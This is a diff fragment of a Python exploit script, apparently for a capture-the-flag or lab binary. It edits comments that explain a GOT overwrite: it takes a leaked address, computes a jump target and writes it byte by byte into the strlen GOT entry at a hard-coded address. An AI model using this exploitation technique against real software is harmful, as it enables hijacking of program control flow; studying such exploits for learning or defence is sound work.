@@ -64,15 +64,17 @@ print('Leaked address received: ' + hex(address))
 jump_location = address + OFFSET_FINAL
 #We can't simply rewrite EXIT_GOT to that value, is too large
 #We also cannot manually write to it, since we can only use the EXIT_GOT
-#address once. Thus, we need to write the value to the GOT of another function
-#not called in the set_exit_message function.
+#address once (otherwise will segfault). Thus, we need to write the value
+#to the GOT of another function not called in the set_exit_message function.
 #The strlen function in set_prompt will work.
 
 STRLEN_GOT = 0x601210
 print('Target write: ' + hex(jump_location))
 print('Writing to STRLEN_GOT at 0x601210...')
 
-#Perform 6 2-byte writes
+#Perform 6 1-byte writes to the strlen GOT entry since the address is 6 bytes
+#Really this just performs the write in 1-byte increments depending on how long
+#the address is.
 jmp = hex(jump_location)[2:]
 for write in range(0, len(jmp) // 2):
     hex_val = jmp[len(jmp) - ((write + 1) * 2):len(jmp) - (write * 2)]
